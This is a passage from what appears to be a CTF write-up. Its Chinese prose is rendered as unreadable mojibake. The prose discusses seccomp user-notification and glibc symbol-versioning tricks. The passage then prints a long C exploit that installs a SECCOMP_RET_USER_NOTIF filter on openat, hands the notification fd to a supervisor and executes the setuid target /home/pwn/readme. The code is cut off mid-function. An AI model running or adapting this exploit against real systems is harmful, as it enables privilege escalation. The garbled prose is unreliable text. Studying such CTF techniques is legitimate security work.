å¦åˆ™é€šè¿‡execveæ‰§è¡Œsetuidç¨‹åºåè£…è½½ä¸€ä¸ªä¸æ‰§è¡Œ<code>setuid()</code>ä¸”è¿”å›0çš„filteræ—¶, è¿™æ ·çš„ç¨‹åºä¼šåœ¨æ²¡æœ‰çœŸæ­£drop privilegesçš„æƒ…å†µä¸‹ç»§ç»­è¿è¡Œmalicious commands. </p><p>è€Œç¬¬äºŒä¸ªå‚æ•°flagsè¦ä½¿ç”¨<code>SECCOMP_FILTER_FLAG_NEW_LISTENER</code>, è¿™æ ·æˆåŠŸå®‰è£…filteråï¼Œè¿”å›ä¸€ä¸ªæ–°çš„user-space notification fileã€‚(ä¸ºæ–‡ä»¶æè¿°ç¬¦è®¾ç½®äº†â€œclose-on-execâ€ flagã€‚)å½“filterè¿”å›SECCOMP_RET_USER_NOTIFæ—¶ï¼Œå°†å‘è¯¥fdå‘é€é€šçŸ¥ã€‚æ¯çº¿ç¨‹æœ€å¤šåªèƒ½è£…è½½ä¸€ä¸ªå¸¦æœ‰è¿™ä¸ªflagçš„filter.</p><ul><li><code>SECCOMP_IOCTL_NOTIF_ADDFD</code> </li></ul><p>The SECCOMP_IOCTL_NOTIF_ADDFD operation (available since Linux5.9) allows the supervisor to <strong>install a file descriptor</strong> into thetargetâ€™s file descriptor table. </p><ul><li><a href="http://web.mit.edu/rhel-doc/3/rhel-as-en-3/symver.html"><code>.symver</code></a> directive and <a href="https://gcc.gnu.org/wiki/SymbolVersioning">SymbolVersioning</a> | <a href="https://sourceware.org/binutils/docs/ld/VERSION.html"><em>linker script</em> VERSION command</a> </li></ul><p>æ€»ä¹‹å°±æ˜¯å°†symbolç»‘å®šåˆ°version nodeä¸Š, ä¸€ä¸ªsymbolå¯ä»¥æœ‰å¤šä¸ªversion node, æœ€å…³é”®çš„æ˜¯map file.</p><p>åŒæ—¶å¯ä»¥åœ¨åº“çš„æºä»£ç ä¸­æ·»åŠ ç»‘å®šä¿¡æ¯, è¿™æ ·å¯ä»¥å‡å°‘shared library maintainrçš„å·¥ä½œ, ä¸è¿‡æ­¤æ—¶mapfileå¿…é¡»åŒ…æ‹¬æ‰€æœ‰çš„version node, ä¹Ÿå°±æ˜¯è¿™ä¸ªasm trickåªæ˜¯mapfileçš„è¡¥å……. </p><p>ç»è¿‡æµ‹è¯•, solutionä¸­çš„payload.cå¯ä»¥å¤§å¹…åº¦ç¼©å‡, payload.mapä¹Ÿå¯ä»¥åˆ å»2.34çš„å®šä¹‰:</p><ul><li>putså®Œå…¨æ²¡å¿…è¦, åªè¦<code>__libc_start_main</code>è¢«ä¿®æ”¹ä¸ºwriteå‡½æ•°ä¹‹åå°±å·²ç»è¾¾æˆç›®çš„. </li><li>æºç ä¸­ä½¿ç”¨asmæŠŠ<code>__libc_start_main_impl</code>å½“åš<code>__libc_start_main</code>çš„alias,<br>ä¸è¿‡ä¹Ÿå¯ä»¥ç›´æ¥ä¸è¦impl, ç›´æ¥<code>__libc_start_main</code>å°±è¡Œäº†</li><li>å¤´æ–‡ä»¶ä¹Ÿæ²¡å¿…è¦. 2.2.5ä¹Ÿæ²¡å¿…è¦. ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªç‰ˆæœ¬å·æˆ‘ä¹Ÿä¸çŸ¥é“. </li><li>è¿‡äº†ä¸€ä¸ªæœˆå†è¯•å‘ç°payload.mapé‡Œ2.2.5å’Œ2.34éƒ½ä¸èƒ½åˆ å», å¦åˆ™libcä¼šæŠ¥version not found. åŸå› æœªçŸ¥.</li></ul><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do                    \</span><br><span class="hljs-meta">  &#123;                     \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sendfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd, <span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">recvfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data, fd;<br>  <span class="hljs-keyword">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS)<br>  &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sigchldHandler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X32_SYSCALL_BIT 0x40000001</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeSocketPair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pid_t</span> <span class="hljs-title">targetProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-keyword">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">allocSeccompNotifBuffers</span><span class="hljs-params">(struct seccomp_notif **req,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_resp **resp,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_sizes *sizes)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  